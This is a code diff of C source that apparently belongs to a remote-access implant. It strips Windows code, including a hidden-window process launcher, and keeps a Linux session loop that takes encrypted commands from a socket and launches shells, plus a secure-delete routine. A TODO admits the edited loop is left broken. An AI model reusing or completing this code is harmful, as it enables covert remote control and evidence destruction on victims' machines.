@@ -12,11 +12,6 @@
 #include <sys/wait.h>
 #endif
 
-#if defined WIN32
-#include <io.h>
-#include "timeout.h"
-#endif
-
 #include "launchshell.h"
 
 #define _USE_32BIT_TIME_T
@@ -35,18 +30,10 @@ static int hstat( int fd );
 const unsigned long CMD_TIMEOUT = 5*60*1000; // 5 minutes
 const unsigned long PKT_TIMEOUT = 30*1000; // 30 sec.
 
-#ifdef WIN32
-__declspec( thread ) static havege_state trig_hs;
-__declspec( thread ) static ssl_context	trig_ssl;
-__declspec( thread ) static ssl_session	trig_ssn;
-#undef _fstat
-int _fstat(int fd, struct stat *buffer);
-#else
 static havege_state trig_hs;
 static ssl_context	trig_ssl;
 static ssl_session	trig_ssn;
 #define _fstat fstat
-#endif
 
 //******************************************************************
 //***************** Cross Platform functions ***********************
@@ -355,10 +342,6 @@ int SecureDelete( char *path )
 	int				numWritten;
 	int				fsize;
 
-#ifdef WIN32
-	HFILE			winHan = -1;
-#endif
-
 	// Just to make sure
 	memset( zerobuf, 0, 4096 );
 
@@ -407,16 +390,6 @@ int SecureDelete( char *path )
 	fflush(fd); //Flush the CRT buffers... this will send to OS buffers
 
 	//... so flush the OS buffers so that the zeros are actually written to disk
-#ifdef WIN32
-	if( (winHan = _get_osfhandle( fileno(fd))) == -1)
-	{
-		goto Error;
-	}
-	else if( FlushFileBuffers( winHan ) == 0)
-	{
-		goto Error;
-	}
-#endif
 
 #if defined LINUX || defined SOLARIS
 	if ( 0 != fsync( fileno(fd)) ) goto Error;
@@ -533,90 +506,7 @@ Error:
 //************** Platform specific functions ***********************
 //******************************************************************
 
-
-#ifdef WIN32
-
-int Execute( char *path )
-{
-	PROCESS_INFORMATION procInfo = {0};
-	STARTUPINFOA	strt = {0};
-
-	// Init startup info. Try to make sure no window appears.
-	strt.cb = sizeof(STARTUPINFOA);
-	strt.wShowWindow = SW_HIDE;
-	strt.dwFlags = STARTF_USESHOWWINDOW;
-
-	// Attempt to create new process
-	if (!CreateProcessA(NULL, path, NULL, NULL, 0, 0, NULL, NULL, &strt, &procInfo))
-	{
-		return GetLastError();
-	}
-
-	// Close newly created handles
-	CloseHandle(procInfo.hProcess);
-	CloseHandle(procInfo.hThread);
-
-	return 0;
-
-}
-
-// ExpandEnvStrings is a function that will expand <char* path> into a 
-// new buffer <char** newpath>. The new expanded char* will contain all of the
-// inputed system variables (ie %SYSTEMROOT%) into the correct path.
-//
-// USAGE:
-//  char* newbuff = 0;
-//	ExpandEnvStrings( "%SYSTEMROOT%\\", &newbuff) );
-//  free(newpath);
-//  Where newbuff will then equal EXAMPLE: "C:\Windows\"
-//
-// RETURNS:
-//   returns -1 if function fails to expand, 0 if it worked
-//   Either way it will return a string in newpath that needs to be freed.
-//   On failures the returned string will be the inputed string.
-//
-// WARNING/CLEANUP:
-//   MUST call free() on the output buffer, "newpath" if the function succeeds.
-//   On failures the returned string will be the inputed string and will still need
-//   to be freed.
-// 
-
-int ExpandEnvStrings( char* path, char** newpath)
-{
-	int retval = 0;
-	DWORD expstrSize = 0;
-	DWORD retValue = ExpandEnvironmentStringsA(path, *newpath, expstrSize);
-
-	*newpath = (char*) malloc( retValue*sizeof(char));
-	if (NULL != newpath)
-	{
-		expstrSize = retValue;
-		retValue = ExpandEnvironmentStringsA(path, *newpath, expstrSize);
-		if( retValue == 0)
-		{
-			free(*newpath);
-			retval = -1;
-			goto SetOriginialandExit;
-		}
-	}
-	else
-	{
-		retval = -1;
-		goto SetOriginialandExit;
-	}
-
-	return 0;
-
-SetOriginialandExit:
-	//Looks messy but its leet sizeof( ((COMMAND*)0)->path)
-	//ball'n way to get the size of the path from the command struct
-	*newpath = (char*) malloc( sizeof( ((COMMAND*)0)->path) ); 
-	memcpy( *newpath, path, sizeof( ((COMMAND*)0)->path)); 
-	return retval;
-}
-#endif
-
-#if defined LINUX || defined WIN32
+#if defined LINUX
 
 unsigned long StartClientSession( int sock )
 {
@@ -661,25 +551,13 @@ unsigned long StartClientSession( int sock )
 #ifdef LINUX
 			alarm( SESSION_TIMEOUT );
 #endif
-#ifdef WIN32
-			timeoutSetup(SESSION_TIMEOUT * 1000, &sock);//you need to * 1000 to make it miliseconds
-#endif
 			//		Receive(sock, (unsigned char*)&cmd, sizeof(cmd), CMD_TIMEOUT);
+			//TODO: Fix this. There's nothing in this loop after removing the WIN32 code.
 			if( 0 > crypt_read( &trig_ssl, (unsigned char *)&cmd, sizeof( COMMAND ) ) )
 			{
-#ifdef WIN32
-				endTimeout();
-				if( commandpath != 0 ) free( commandpath );
-				closesocket(sock);
-				crypt_cleanup( &trig_ssl);
-				ExitThread(0);
-#endif
 			}
 #ifdef LINUX
 			alarm( 0 );
-#endif
-#ifdef WIN32
-			endTimeout();
 #endif
 
 			// Expand the cmd.path to the proper path resolving ENVIRONMENT variables
@@ -747,13 +625,6 @@ unsigned long StartClientSession( int sock )
 					D( printf( " DEBUG: launchshell() returned %i\n", (int)ret.reply ); )
 					break;
 
-#ifdef WIN32
-					if( commandpath != 0 ) free( commandpath );
-					closesocket(sock);
-					crypt_cleanup( &trig_ssl);
-					//_CrtDumpMemoryLeaks();//IAN DELETE LATER IAN COMMENT OR DELETE
-					ExitThread(0);
-#endif
 					// not reached ???
 					goto Exit;
 
